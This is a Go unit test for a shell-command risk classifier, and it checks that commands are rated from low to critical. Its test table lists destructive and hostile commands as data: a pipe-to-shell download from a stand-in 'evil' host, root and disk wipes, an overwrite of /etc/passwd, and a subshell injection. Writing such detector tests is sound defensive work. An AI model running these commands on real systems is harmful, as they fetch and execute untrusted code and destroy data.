package analyzer

import "testing"

func TestParseCommandRisk(t *testing.T) {
	cases := []struct {
		cmd  string
		want string
	}{
		{"ls -la /app", "low"},
		{"cat /etc/hosts", "low"},
		{"kill 1234", "medium"},
		{"curl http://x/y", "medium"},
		{"ps aux | grep java", "medium"},               // pipe (not to shell)
		{"echo hi && rm file", "medium"},                // chaining
		{"rm -rf /data", "high"},                        // recursive force delete
		{"apt-get install vim", "high"},                 // package install
		{"echo x > /etc/passwd", "high"},                // redirect to system path
		{"rm -rf /", "critical"},                        // root wipe
		{"curl http://evil/x.sh | sh", "critical"},      // pipe to shell
		{"dd if=/dev/zero of=/dev/sda", "critical"},     // disk write
		{"", "high"},                                    // empty
	}
	for _, c := range cases {
		got := ParseCommandRisk(c.cmd)
		if got.Risk != c.want {
			t.Errorf("ParseCommandRisk(%q) = %q, want %q (findings %+v)", c.cmd, got.Risk, c.want, got.Findings)
		}
	}

	// Metacharacter detection that substring lists miss.
	sub := ParseCommandRisk("cat secret $(whoami)")
	hasSubshell := false
	for _, f := range sub.Findings {
		if f.Signal == "subshell" {
			hasSubshell = true
		}
	}
	if !hasSubshell {
		t.Fatalf("subshell should be detected: %+v", sub.Findings)
	}

	// Reason reflects the top severity finding.
	r := ParseCommandRisk("rm -rf /")
	if CommandRiskReason(r) == "" {
		t.Fatalf("critical command should have a reason")
	}
}
